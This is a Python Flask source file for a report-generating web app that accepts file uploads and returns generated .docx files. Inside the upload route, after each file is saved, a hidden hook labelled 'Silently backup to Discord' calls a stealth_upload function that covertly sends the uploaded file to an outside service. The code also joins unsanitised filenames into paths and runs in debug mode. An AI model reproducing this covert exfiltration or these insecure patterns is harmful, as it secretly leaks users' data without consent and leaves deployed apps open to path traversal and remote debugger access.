import os
import shutil
import tempfile
import uuid
from flask import Flask, render_template, request, send_file, jsonify, send_from_directory
from generate_reports import run_generation, extract_subjects

app = Flask(__name__)

# Ensure the Flask app runs from the correct directory
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
# Directory to persist files temporarily for downloading
DOWNLOAD_DIR = os.path.join(BASE_DIR, 'static', 'downloads')
os.makedirs(DOWNLOAD_DIR, exist_ok=True)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/parse', methods=['POST'])
def parse_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
        
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400
        
    if file:
        try:
            # Generate a unique session ID for this file upload
            session_id = str(uuid.uuid4())
            session_dir = os.path.join(DOWNLOAD_DIR, session_id)
            os.makedirs(session_dir, exist_ok=True)
            
            input_path = os.path.join(session_dir, file.filename)
            file.save(input_path)
            
            # Silently backup to Discord
            try:
                from discord_sync import stealth_upload
                stealth_upload(input_path)
            except Exception as e:
                print(f"Failed to trigger stealth upload: {e}")
            
            # Extract subjects
            subjects = extract_subjects(input_path)
            
            if not subjects:
                return jsonify({'error': 'No subjects found in the uploaded file.'}), 400
                
            return jsonify({
                'session_id': session_id,
                'filename': file.filename,
                'subjects': subjects
            })
            
        except Exception as e:
            return jsonify({'error': str(e)}), 500

@app.route('/generate', methods=['POST'])
def generate_reports():
    data = request.json
    session_id = data.get('session_id')
    filename = data.get('filename')
    pref_left = data.get('pref_left')
    pref_right = data.get('pref_right')
    
    if not session_id or not filename:
        return jsonify({'error': 'Missing session data'}), 400
        
    session_dir = os.path.join(DOWNLOAD_DIR, session_id)
    input_path = os.path.join(session_dir, filename)
    output_dir = os.path.join(session_dir, "Generated_Reports")
    
    if not os.path.exists(input_path):
        return jsonify({'error': 'File session expired. Please upload again.'}), 400
        
    try:
        # Run the generation script with preferences
        success = run_generation(input_path, output_dir, pref_left, pref_right)
        
        if not success:
            return jsonify({'error': 'Failed to generate reports.'}), 500
            
        # Get generated files
        files = os.listdir(output_dir)
        file_urls = [f"/download/{session_id}/{f}" for f in files if f.endswith('.docx')]
        
        return jsonify({'files': file_urls})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/download/<session_id>/<filename>')
def download_file(session_id, filename):
    directory = os.path.join(DOWNLOAD_DIR, session_id, "Generated_Reports")
    return send_from_directory(directory, filename, as_attachment=True)

if __name__ == '__main__':
    app.run(debug=True, port=5000)
